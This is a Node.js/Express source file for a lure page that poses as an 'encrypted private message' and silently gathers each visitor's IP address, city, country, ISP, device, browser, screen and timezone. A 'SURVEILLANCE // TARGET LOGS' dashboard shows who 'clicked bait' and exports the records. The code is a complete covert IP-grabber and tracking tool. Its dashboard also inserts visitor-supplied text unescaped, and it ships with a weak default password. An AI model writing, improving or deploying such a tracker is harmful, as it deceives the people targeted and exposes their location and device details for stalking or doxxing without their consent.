const express = require("express");
const net = require("node:net");
const crypto = require("node:crypto");
const fs = require("node:fs");

const app = express();

const PORT = process.env.PORT || 3000;
const USER = process.env.OWNER_USER || "owner";
const PASS = process.env.OWNER_PASS || "admin123";
const DATA_FILE = process.env.DATA_FILE || "./visits.json";
const MAX_VISITS = 1000;
const DEDUPE_MS = 3 * 60 * 1000;

app.set("trust proxy", true);
app.disable("x-powered-by");
app.use(express.json({ limit: "64kb" }));

// ---------- helpers ----------
const sha = v => crypto.createHash("sha256").update(String(v)).digest();
const USER_H = sha(USER);
const PASS_H = sha(PASS);

const rateBuckets = new Map();
function hit(key, limit, windowMs) {
  const now = Date.now();
  const arr = (rateBuckets.get(key) || []).filter(t => now - t < windowMs);
  arr.push(now);
  rateBuckets.set(key, arr);
  return arr.length > limit;
}

function secure(req, res, next) {
  const nonce = crypto.randomBytes(16).toString("base64");
  res.locals.nonce = nonce;
  res.set({
    "Content-Security-Policy":
      `default-src 'none'; script-src 'nonce-${nonce}' 'unsafe-inline'; style-src 'nonce-${nonce}' 'unsafe-inline'; ` +
      "connect-src 'self' https://ipwho.is https://ipapi.co https://api.ipify.org; img-src 'self' data:; base-uri 'none'; form-action 'none'; frame-ancestors 'none'",
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "no-referrer",
    "X-Frame-Options": "DENY",
    "Cache-Control": "no-store"
  });
  next();
}
app.use(secure);

function auth(req, res, next) {
  const ip = req.ip || "x";
  if (hit("fail:" + ip, 20, 15 * 60 * 1000)) {
    return res.status(429).send("Too many attempts. Try later.");
  }
  const header = req.headers.authorization || "";
  let ok = false;
  if (header.startsWith("Basic ")) {
    try {
      const cred = Buffer.from(header.slice(6), "base64").toString();
      const i = cred.indexOf(":");
      if (i !== -1) {
        const u = crypto.timingSafeEqual(sha(cred.slice(0, i)), USER_H);
        const p = crypto.timingSafeEqual(sha(cred.slice(i + 1)), PASS_H);
        ok = u && p;
      }
    } catch {}
  }
  if (!ok) {
    res.set("WWW-Authenticate", 'Basic realm="Owner"');
    return res.status(401).send("Login required");
  }
  rateBuckets.delete("fail:" + ip);
  next();
}

// ---------- storage ----------
let visits = [];
try {
  visits = JSON.parse(fs.readFileSync(DATA_FILE, "utf8")).slice(0, MAX_VISITS);
} catch {}

let saveTimer;
function save() {
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    fs.writeFile(DATA_FILE, JSON.stringify(visits, null, 2), err => {
      if (err) console.error("Save error:", err.message);
    });
  }, 400);
}

// ---------- IP & Location Extraction ----------
function isPrivateIp(ip) {
  if (!ip) return true;
  return /^(10\.|127\.|192\.168\.|169\.254\.|172\.(1[6-9]|2\d|3[01])\.|::1$|fc|fd|fe80)/i.test(ip);
}

function extractRealIp(req) {
  const cf = req.headers["cf-connecting-ip"];
  if (cf) return cf.trim();

  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    const list = forwarded.split(",").map(s => s.trim().replace(/^::ffff:/, ""));
    const publicIp = list.find(ip => !isPrivateIp(ip));
    if (publicIp) return publicIp;
    return list[0];
  }

  const real = req.headers["x-real-ip"];
  if (real) return real.trim().replace(/^::ffff:/, "");

  return (req.ip || req.socket?.remoteAddress || "").replace(/^::ffff:/, "");
}

async function getLocation(ip) {
  const cleanIp = (ip || "").replace(/^::ffff:/, "").trim();
  const isLocal = isPrivateIp(cleanIp);
  const targetParam = isLocal ? "" : encodeURIComponent(cleanIp);

  const fetchOpts = {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Accept": "application/json"
    },
    signal: AbortSignal.timeout(4500)
  };

  const providers = [
    async () => {
      const url = targetParam ? `https://ipwho.is/${targetParam}` : `https://ipwho.is/`;
      const r = await fetch(url, fetchOpts);
      const d = await r.json();
      if (!d.success) throw new Error("ipwho.is error");
      return {
        ip: d.ip || cleanIp,
        city: d.city || "Unknown City",
        region: d.region || "",
        country: d.country || "Unknown Country",
        cc: d.country_code || "",
        isp: d.connection?.isp || d.connection?.org || "Unknown ISP"
      };
    },
    async () => {
      const url = targetParam ? `http://ip-api.com/json/${targetParam}?fields=status,message,country,countryCode,regionName,city,isp,org,query` : `http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,isp,org,query`;
      const r = await fetch(url, fetchOpts);
      const d = await r.json();
      if (d.status !== "success") throw new Error("ip-api error");
      return {
        ip: d.query || cleanIp,
        city: d.city || "Unknown City",
        region: d.regionName || "",
        country: d.country || "Unknown Country",
        cc: d.countryCode || "",
        isp: d.isp || d.org || "Unknown ISP"
      };
    }
  ];

  for (const p of providers) {
    try {
      const res = await p();
      if (res.country && res.country !== "Unknown Country") {
        return res;
      }
    } catch (e) {}
  }

  return {
    ip: cleanIp || "127.0.0.1",
    city: "Local Device",
    region: "",
    country: "Direct Host",
    cc: "",
    isp: "Local Network"
  };
}

// ---------- Visitor Clickbait Landing Page ----------
app.get("/", (req, res) => {
  const n = res.locals.nonce;
  res.type("html").send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#000000">
<meta name="robots" content="noindex, nofollow">
<title>hi.</title>
<style nonce="${n}">
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;background:#000000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,monospace;overflow:hidden;display:flex;align-items:center;justify-content:center}
canvas{position:fixed;inset:0;width:100%;height:100%;z-index:0;opacity:.25;pointer-events:none}
main{position:relative;z-index:2;width:92%;max-width:480px;text-align:center;padding:20px}

.badge{display:inline-flex;align-items:center;gap:7px;background:rgba(255,40,40,.15);border:1px solid rgba(255,50,50,.4);padding:6px 14px;border-radius:20px;font-size:11px;font-weight:700;letter-spacing:1.5px;color:#ff5252;margin-bottom:24px;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.04);opacity:.85}}
.dot{width:7px;height:7px;background:#ff3333;border-radius:50%;box-shadow:0 0 8px #ff3333}

h1{font-size:clamp(68px,16vw,110px);font-weight:900;letter-spacing:-2px;line-height:1;margin:0 0 16px;background:linear-gradient(180deg,#fff,#888);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 40px rgba(255,255,255,.2)}
.sub{color:#9e9e9e;font-size:14px;line-height:1.6;margin-bottom:34px}
.sub strong{color:#fff;font-weight:600}

.cta-box{position:relative;display:inline-block;width:100%}
button{width:100%;background:#ffffff;color:#000000;border:0;padding:18px 24px;font-size:14px;font-weight:700;letter-spacing:2px;border-radius:6px;cursor:pointer;transition:all .2s ease;box-shadow:0 0 25px rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center;gap:10px}
button:hover{background:#f0f0f0;transform:translateY(-2px);box-shadow:0 0 35px rgba(255,255,255,.3)}
button:active{transform:translateY(0)}
button:disabled{opacity:.6;cursor:wait;transform:none}

.disclaimer{color:#444;font-size:11px;margin-top:22px;letter-spacing:.5px}
.hidden{display:none!important}

#reveal-box{animation:fadeIn .6s ease forwards}
@keyframes fadeIn{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:none}}
.reveal-text{font-size:32px;font-weight:800;letter-spacing:-1px;margin-bottom:12px;color:#fff}
.reveal-sub{color:#777;font-size:14px;line-height:1.6}
.bar{height:2px;background:#1a1a1a;margin:28px auto 0;width:160px;border-radius:2px;overflow:hidden}
.bar i{display:block;height:100%;width:0;background:#fff;animation:fill 1.2s ease forwards}
@keyframes fill{to{width:100%}}
</style>
</head>
<body>
<canvas id="c"></canvas>
<main>
  <div id="screen-gate">
    <div class="badge"><span class="dot"></span> 1 CONFIDENTIAL MESSAGE</div>
    <h1>hi.</h1>
    <p class="sub">Someone left an encrypted private message for you.<br>Tap below to decrypt and play.</p>
    <div class="cta-box">
      <button id="btn">▶ OPEN PRIVATE MESSAGE</button>
    </div>
    <p class="disclaimer">End-to-end encrypted direct transmission</p>
  </div>

  <div id="reveal-box" class="hidden">
    <h2 class="reveal-text">hi. 🙂</h2>
    <p class="reveal-sub">That's it. Nothing scary.<br>Just wanted to say hi to you.</p>
    <div class="bar"><i></i></div>
  </div>
</main>

<script nonce="${n}">
// Client-side Direct Geo & Telemetry Lookup (Guarantees Real City & Country)
async function getFullTelemetry(actionName) {
  const ua = navigator.userAgent || "";
  let os = "Desktop OS";
  if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
  else if (/android/i.test(ua)) os = "Android";
  else if (/win/i.test(ua)) os = "Windows";
  else if (/mac/i.test(ua)) os = "macOS";
  else if (/linux/i.test(ua)) os = "Linux";

  let device = "PC / Desktop";
  if (/iphone/i.test(ua)) device = "iPhone";
  else if (/ipad/i.test(ua)) device = "iPad";
  else if (/android/i.test(ua) && /mobile/i.test(ua)) device = "Android Phone";
  else if (/tablet|android/i.test(ua)) device = "Tablet";
  else if (/mac/i.test(ua)) device = "Mac";

  let browser = "Browser";
  if (/edg/i.test(ua)) browser = "Edge";
  else if (/chrome|crios/i.test(ua)) browser = "Chrome";
  else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
  else if (/safari/i.test(ua)) browser = "Safari";

  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
  const screen = window.screen ? (window.screen.width + "x" + window.screen.height + " (" + (window.devicePixelRatio||1) + "x)") : "";

  let clientGeo = {};
  try {
    const geoReq = await fetch("https://ipwho.is/", { signal: AbortSignal.timeout(3000) });
    const gd = await geoReq.json();
    if (gd.success) {
      clientGeo = {
        clientIp: gd.ip,
        city: gd.city,
        region: gd.region,
        country: gd.country,
        cc: gd.country_code,
        isp: gd.connection?.isp || gd.connection?.org
      };
    }
  } catch(e) {}

  return {
    action: actionName || "Landed on Page",
    device: device,
    os: os,
    browser: browser,
    screen: screen,
    timezone: timezone,
    language: navigator.language || "Unknown",
    ...clientGeo
  };
}

// Auto-run silently on load
(async function(){
  try {
    const payload = await getFullTelemetry("Landed on Page");
    fetch("/api/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch(e){}
})();

// Clickbait button
const btn = document.getElementById("btn");
btn.addEventListener("click", async () => {
  btn.disabled = true;
  btn.textContent = "DECRYPTING...";

  // audio beep effect
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(500, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.15);
    gain.gain.setValueAtTime(0.08, ctx.currentTime);
    gain.gain.linearRampToValueAtTime(0.01, ctx.currentTime + 0.2);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.22);
  } catch(e){}

  try {
    const payload = await getFullTelemetry("Clicked Reveal Button");
    await fetch("/api/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch(e){}

  setTimeout(() => {
    document.getElementById("screen-gate").classList.add("hidden");
    document.getElementById("reveal-box").classList.remove("hidden");
  }, 450);
});

// Particles
(function(){
  const cv=document.getElementById("c"),ctx=cv.getContext("2d");
  let w,h,pts=[];
  function rsz(){w=cv.width=innerWidth;h=cv.height=innerHeight;pts=Array.from({length:Math.min(50,w/20|0)},()=>({x:Math.random()*w,y:Math.random()*h,vx:(Math.random()-.5)*.25,vy:(Math.random()-.5)*.25}))}
  addEventListener("resize",rsz);rsz();
  (function lp(){
    ctx.clearRect(0,0,w,h);ctx.fillStyle="rgba(255,255,255,.4)";
    for(const p of pts){
      p.x+=p.vx;p.y+=p.vy;if(p.x<0||p.x>w)p.vx*=-1;if(p.y<0||p.y>h)p.vy*=-1;
      ctx.fillRect(p.x,p.y,1.5,1.5);
    }
    requestAnimationFrame(lp);
  })();
})();
</script>
</body>
</html>`);
});

// ---------- Tracking API ----------
app.post("/api/log", async (req, res) => {
  try {
    const body = req.body || {};
    // Use the client-detected real public IP if available, otherwise server header
    const ip = body.clientIp || extractRealIp(req);

    if (hit("rate:" + ip, 40, 60_000)) {
      return res.status(429).json({ success: false });
    }

    const now = Date.now();
    let entry = visits.find(v => v.ip === ip && now - Date.parse(v.time) < DEDUPE_MS);

    // If no existing or existing had "Unknown", perform full lookup
    if (!entry || entry.city === "Unknown" || entry.country === "Unknown") {
      let loc = {
        city: body.city,
        region: body.region,
        country: body.country,
        cc: body.cc,
        isp: body.isp
      };

      if (!loc.country || loc.country === "Unknown") {
        loc = await getLocation(ip);
      }

      if (entry) {
        // Update existing record
        entry.city = loc.city || entry.city;
        entry.region = loc.region || entry.region;
        entry.country = loc.country || entry.country;
        entry.cc = loc.cc || entry.cc;
        entry.isp = loc.isp || entry.isp;
        entry.hits = (entry.hits || 1) + 1;
        entry.action = body.action || entry.action;
        entry.time = new Date().toISOString();
      } else {
        // Create new record
        entry = {
          ip: ip,
          city: loc.city || "Direct",
          region: loc.region || "",
          country: loc.country || "Direct",
          cc: loc.cc || "",
          isp: loc.isp || "Direct Connection",
          device: body.device || "Desktop",
          os: body.os || "Unknown",
          browser: body.browser || "Unknown",
          screen: body.screen || "Unknown",
          timezone: body.timezone || "",
          language: body.language || "en",
          action: body.action || "Landed on Page",
          time: new Date().toISOString(),
          hits: 1
        };
        visits.unshift(entry);
        visits.splice(MAX_VISITS);
      }
      console.log(`[TARGET LOGGED] ${entry.ip} -> ${entry.city}, ${entry.country} (${entry.device})`);
    } else {
      entry.hits = (entry.hits || 1) + 1;
      entry.time = new Date().toISOString();
      if (body.action) entry.action = body.action;
    }

    save();
    res.json({ success: true });
  } catch (err) {
    console.error("Log error:", err);
    res.status(500).json({ success: false });
  }
});

// ---------- Owner Dashboard ----------
app.get("/owner/data.json", auth, (req, res) => res.json(visits));

app.get("/owner/export.csv", auth, (req, res) => {
  const esc = v => {
    let s = String(v ?? "");
    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
    return /[",\n]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
  };
  const headers = ["IP", "City", "Region", "Country", "ISP", "Device", "OS", "Browser", "Screen", "Timezone", "Action", "Hits", "Last Seen"];
  const rows = [
    headers,
    ...visits.map(v => [
      v.ip,
      v.city,
      v.region || "",
      v.country,
      v.isp || "",
      v.device || "",
      v.os || "",
      v.browser || "",
      v.screen || "",
      v.timezone || "",
      v.action || "",
      v.hits || 1,
      v.time
    ])
  ];
  res.type("text/csv")
    .set("Content-Disposition", 'attachment; filename="target_visits.csv"')
    .send(rows.map(r => r.map(esc).join(",")).join("\n"));
});

app.post("/owner/clear", auth, (req, res) => {
  if (req.get("x-owner-action") !== "clear") return res.status(400).json({ success: false });
  visits = [];
  try { fs.unlinkSync(DATA_FILE); } catch(e){}
  save();
  res.json({ success: true });
});

app.get("/owner", auth, (req, res) => {
  const n = res.locals.nonce;
  res.type("html").send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex">
<title>Intel Dashboard</title>
<style nonce="${n}">
*{box-sizing:border-box}
body{background:#080808;color:#eaeaea;font-family:ui-monospace,SFMono-Regular,Consolas,monospace;margin:0;padding:24px}
header{display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:20px;flex-wrap:wrap;gap:12px}
h1{font-size:22px;letter-spacing:1px;margin:0;color:#fff}
.sub{color:#777;font-size:12px;margin-top:4px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:20px}
.card{background:#111;border:1px solid #222;border-radius:4px;padding:14px 16px}
.card span{font-size:11px;color:#888;letter-spacing:1px}
.card b{display:block;font-size:24px;color:#fff;margin-top:4px}
.tools{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
input,button,a.btn{background:#141414;color:#eee;border:1px solid #2c2c2c;padding:10px 14px;font:inherit;font-size:12px;border-radius:4px;text-decoration:none}
input{flex:1;min-width:240px}
input:focus{outline:none;border-color:#555}
button,a.btn{cursor:pointer;transition:.15s}
button:hover,a.btn:hover{background:#202020}
.danger{color:#ff6b6b;border-color:#5a2222}
.danger:hover{background:#3a1515}
.wrap{overflow-x:auto;background:#0d0d0d;border:1px solid #1c1c1c;border-radius:6px}
table{width:100%;border-collapse:collapse;min-width:980px}
th,td{padding:12px 14px;border-bottom:1px solid #191919;text-align:left;font-size:12px}
th{color:#777;font-size:11px;letter-spacing:1px;background:#101010}
tr:hover td{background:#121212}
.badge-click{background:#381c00;color:#ff9800;border:1px solid #733c00;padding:2px 7px;border-radius:3px;font-size:10px;font-weight:700}
.badge-view{background:#102213;color:#4caf50;border:1px solid #1b4922;padding:2px 7px;border-radius:3px;font-size:10px}
.dim{color:#666}
.ip-text{font-weight:bold;color:#4da3ff}
</style>
</head>
<body>
<header>
  <div>
    <h1>SURVEILLANCE // TARGET LOGS</h1>
    <div class="sub">Auto-refreshes every 5s · <span id="upd">syncing…</span></div>
  </div>
</header>

<div class="stats">
  <div class="card"><span>TOTAL VISITS</span><b id="s1">0</b></div>
  <div class="card"><span>UNIQUE IPS</span><b id="s2">0</b></div>
  <div class="card"><span>COUNTRIES</span><b id="s3">0</b></div>
  <div class="card"><span>CLICK-THROUGH</span><b id="s4">0%</b></div>
</div>

<div class="tools">
  <input id="q" placeholder="Filter targets by IP, City, Country, Device, ISP…">
  <a class="btn" href="/owner/export.csv">EXPORT CSV</a>
  <button id="clr" class="danger">CLEAR ALL RECORDS</button>
</div>

<div class="wrap">
<table>
<thead>
  <tr>
    <th>TIME</th>
    <th>REAL IP</th>
    <th>LOCATION</th>
    <th>DEVICE & OS</th>
    <th>BROWSER / SCREEN</th>
    <th>ISP / NETWORK</th>
    <th>STATUS</th>
    <th>HITS</th>
  </tr>
</thead>
<tbody id="tb">
  <tr><td colspan="8" class="dim">Gathering intel…</td></tr>
</tbody>
</table>
</div>

<script nonce="${n}">
let data = [];
const $ = id => document.getElementById(id);
const flag = cc => cc && cc.length === 2 ? String.fromCodePoint(...[...cc.toUpperCase()].map(c => 127397 + c.charCodeAt(0))) + " " : "";

function timeAgo(iso) {
  const diff = (Date.now() - Date.parse(iso)) / 1000;
  if (diff < 45) return "just now";
  if (diff < 3600) return (diff / 60 | 0) + "m ago";
  if (diff < 86400) return (diff / 3600 | 0) + "h ago";
  return (diff / 86400 | 0) + "d ago";
}

function render() {
  const q = $("q").value.trim().toLowerCase();
  const rows = data.filter(v => {
    if (!q) return true;
    const str = [v.ip, v.city, v.region, v.country, v.device, v.os, v.browser, v.isp].join(" ").toLowerCase();
    return str.includes(q);
  });

  const uniqueIps = new Set(data.map(v => v.ip)).size;
  const countries = new Set(data.map(v => v.country).filter(c => c && !c.includes("Direct"))).size;
  const clicked = data.filter(v => (v.action || "").includes("Click")).length;
  const ctr = data.length ? Math.round((clicked / data.length) * 100) : 0;

  $("s1").textContent = data.length;
  $("s2").textContent = uniqueIps;
  $("s3").textContent = countries;
  $("s4").textContent = ctr + "%";

  const tb = $("tb");
  tb.textContent = "";

  if (!rows.length) {
    const tr = tb.insertRow();
    const td = tr.insertCell();
    td.colSpan = 8;
    td.className = "dim";
    td.textContent = "No target records found.";
    return;
  }

  for (const v of rows) {
    const tr = tb.insertRow();
    
    // Time
    const tCell = tr.insertCell();
    tCell.innerHTML = "<div>" + timeAgo(v.time) + "</div><div class='dim' style='font-size:10px'>" + new Date(v.time).toLocaleTimeString() + "</div>";
    
    // IP
    const ipCell = tr.insertCell();
    ipCell.className = "ip-text";
    ipCell.textContent = v.ip;

    // Location
    const locCell = tr.insertCell();
    locCell.innerHTML = flag(v.cc) + "<strong>" + (v.city || "Unknown") + "</strong>, " + (v.country || "");

    // Device & OS
    const devCell = tr.insertCell();
    devCell.innerHTML = "<strong>" + (v.device || "Unknown") + "</strong><br><span class='dim'>" + (v.os || "") + "</span>";

    // Browser & Screen
    const scrCell = tr.insertCell();
    scrCell.innerHTML = (v.browser || "Unknown") + "<br><span class='dim'>" + (v.screen || "") + "</span>";

    // ISP
    const ispCell = tr.insertCell();
    ispCell.textContent = v.isp || "Unknown";

    // Status
    const actCell = tr.insertCell();
    const isClicked = (v.action || "").includes("Click");
    actCell.innerHTML = isClicked
      ? "<span class='badge-click'>🔥 CLICKED BAIT</span>"
      : "<span class='badge-view'>👀 OPENED</span>";

    // Hits
    const hitsCell = tr.insertCell();
    hitsCell.textContent = v.hits || 1;
  }
}

async function load() {
  try {
    const r = await fetch("/owner/data.json");
    if (!r.ok) throw 0;
    data = await r.json();
    render();
    $("upd").textContent = "updated " + new Date().toLocaleTimeString();
  } catch {
    $("upd").textContent = "refresh failed";
  }
}

$("q").addEventListener("input", render);
$("clr").addEventListener("click", async () => {
  if (!confirm("Are you sure you want to permanently clear all records?")) return;
  await fetch("/owner/clear", { method: "POST", headers: { "X-Owner-Action": "clear" } });
  load();
});

load();
setInterval(load, 5000);
</script>
</body>
</html>`);
});

app.get("/healthz", (req, res) => res.type("text").send("ok"));
app.use((req, res) => res.status(404).send("Not found"));

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Visitor link:  http://localhost:${PORT}`);
  console.log(`Owner link:    http://localhost:${PORT}/owner  (User: ${USER}, Pass: ${PASS})`);
});
